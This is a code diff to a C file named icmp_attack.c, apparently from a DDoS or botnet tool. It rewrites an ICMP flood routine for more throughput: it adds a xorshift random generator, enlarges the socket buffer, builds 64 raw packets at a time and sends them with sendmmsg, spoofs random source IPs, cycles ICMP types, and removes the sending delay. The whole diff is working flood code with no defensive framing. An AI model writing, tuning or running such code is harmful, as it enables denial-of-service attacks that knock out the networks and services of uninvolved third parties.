@@ -10,37 +10,40 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <pthread.h>
+#include <stdint.h>
 
 #include "icmp_attack.h"
 #include "../headers/protocol.h"
 
 #define ICMP_MAX_PAYLOAD 65500
 #define ICMP_DEFAULT_PAYLOAD 1400
+#define BATCH 64
+
+static inline uint64_t xorshift64(uint64_t *s) {
+    uint64_t x = *s;
+    x ^= x << 13;
+    x ^= x >> 7;
+    x ^= x << 17;
+    return *s = x;
+}
 
 static uint16_t icmp_checksum(void* data, int len) {
     uint32_t sum = 0;
     uint16_t* ptr = (uint16_t*)data;
-    
+
     while (len > 1) {
         sum += *ptr++;
         len -= 2;
     }
-    
+
     if (len == 1) {
         sum += *(uint8_t*)ptr;
     }
-    
+
     sum = (sum >> 16) + (sum & 0xFFFF);
     sum += (sum >> 16);
-    
-    return (uint16_t)(~sum);
-}
 
-static uint32_t rand_ip(void) {
-    return (rand() % 223 + 1) << 24 |
-           (rand() % 255) << 16 |
-           (rand() % 255) << 8 |
-           (rand() % 254 + 1);
+    return (uint16_t)(~sum);
 }
 
 void* icmp_attack(void* arg) {
@@ -61,68 +64,112 @@ void* icmp_attack(void* arg) {
         return NULL;
     }
 
-    int sndbuf = 1024 * 1024;
+    int sndbuf = 4 * 1024 * 1024;
     setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 
     size_t total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;
-    char* packet = (char*)malloc(total_len);
-    if (!packet) {
+    size_t icmp_len  = sizeof(struct icmphdr) + psize;
+
+    /* Seed xorshift PRNG */
+    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32);
+    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;
+
+    /* Pre-allocate batch of packets */
+    char *pkt_buf = malloc(total_len * BATCH);
+    if (!pkt_buf) {
         close(fd);
         return NULL;
     }
 
-    struct iphdr* ip = (struct iphdr*)packet;
-    struct icmphdr* icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
-    char* payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
-
-    for (uint16_t i = 0; i < psize; i++) {
-        payload[i] = rand() & 0xFF;
-    }
-
-    ip->version = 4;
-    ip->ihl = 5;
-    ip->tos = 0;
-    ip->tot_len = htons(total_len);
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_ICMP;
-    ip->daddr = params->target_addr.sin_addr.s_addr;
-
+    struct mmsghdr msgs[BATCH];
+    struct iovec iovs[BATCH];
     struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = ip->daddr;
 
-    time_t end_time = time(NULL) + params->duration;
-    uint16_t seq = 0;
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family      = AF_INET;
+    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;
+
     uint8_t icmp_types[] = {ICMP_ECHO, ICMP_TIMESTAMP, ICMP_INFO_REQUEST, ICMP_ADDRESS};
     int type_count = 4;
-    int type_idx = 0;
 
-    srand(time(NULL) ^ getpid());
+    /* Fill random payload once — shared across all batch slots */
+    for (int i = 0; i < BATCH; i++) {
+        char *pkt = pkt_buf + (total_len * i);
+        memset(pkt, 0, sizeof(struct iphdr) + sizeof(struct icmphdr));
 
-    while (time(NULL) < end_time && params->active) {
-        for (int burst = 0; burst < 100 && params->active; burst++) {
-            ip->id = htons(rand() & 0xFFFF);
-            ip->saddr = rand_ip();
-            ip->check = 0;
+        struct iphdr*  ip   = (struct iphdr*)pkt;
+        struct icmphdr* icmp = (struct icmphdr*)(pkt + sizeof(struct iphdr));
+        char* payload = pkt + sizeof(struct iphdr) + sizeof(struct icmphdr);
 
-            icmp->type = icmp_types[type_idx];
-            icmp->code = 0;
-            icmp->un.echo.id = htons(rand() & 0xFFFF);
-            icmp->un.echo.sequence = htons(seq++);
-            icmp->checksum = 0;
-            icmp->checksum = icmp_checksum(icmp, sizeof(struct icmphdr) + psize);
-
-            sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
-
-            type_idx = (type_idx + 1) % type_count;
+        /* Random payload fill */
+        uint64_t r;
+        for (uint16_t j = 0; j < psize; j += 8) {
+            r = xorshift64(&rng_state);
+            size_t remain = psize - j;
+            memcpy(payload + j, &r, remain < 8 ? remain : 8);
         }
 
-        usleep(100);
+        /* IP header — constant fields */
+        ip->version  = 4;
+        ip->ihl      = 5;
+        ip->tos      = 0;
+        ip->tot_len  = htons(total_len);
+        ip->frag_off = 0;
+        ip->ttl      = 255;
+        ip->protocol = IPPROTO_ICMP;
+        ip->daddr    = params->target_addr.sin_addr.s_addr;
+
+        /* ICMP header — defaults */
+        icmp->type = ICMP_ECHO;
+        icmp->code = 0;
+
+        /* iov / msg setup */
+        iovs[i].iov_base = pkt;
+        iovs[i].iov_len  = total_len;
+
+        memset(&msgs[i], 0, sizeof(msgs[i]));
+        msgs[i].msg_hdr.msg_iov     = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen  = 1;
+        msgs[i].msg_hdr.msg_name    = &dest;
+        msgs[i].msg_hdr.msg_namelen = sizeof(dest);
     }
 
-    free(packet);
+    time_t end_time = time(NULL) + params->duration;
+    uint64_t iter = 0;
+    uint16_t seq = 0;
+
+    while (params->active) {
+        /* Update per-packet varying fields */
+        for (int i = 0; i < BATCH; i++) {
+            char *pkt = pkt_buf + (total_len * i);
+            struct iphdr*   ip   = (struct iphdr*)pkt;
+            struct icmphdr* icmp = (struct icmphdr*)(pkt + sizeof(struct iphdr));
+
+            uint64_t r1 = xorshift64(&rng_state);
+            uint64_t r2 = xorshift64(&rng_state);
+
+            /* Spoof source IP — avoid 0.x.x.x and 224+ ranges */
+            uint32_t sip = (uint32_t)r1;
+            uint8_t first = (sip >> 24) & 0xFF;
+            if (first == 0 || first >= 224) sip = ((first % 223) + 1) << 24 | (sip & 0x00FFFFFF);
+            ip->saddr = sip;
+            ip->id    = htons((uint16_t)(r1 >> 32));
+            ip->check = 0;
+
+            icmp->type            = icmp_types[i & 3];
+            icmp->code            = 0;
+            icmp->un.echo.id      = htons((uint16_t)(r2));
+            icmp->un.echo.sequence = htons(seq++);
+            icmp->checksum        = 0;
+            icmp->checksum        = icmp_checksum(icmp, icmp_len);
+        }
+
+        sendmmsg(fd, msgs, BATCH, MSG_NOSIGNAL);
+
+        if ((++iter & 0x3F) == 0 && time(NULL) >= end_time) break;
+    }
+
+    free(pkt_buf);
     close(fd);
     return NULL;
 }
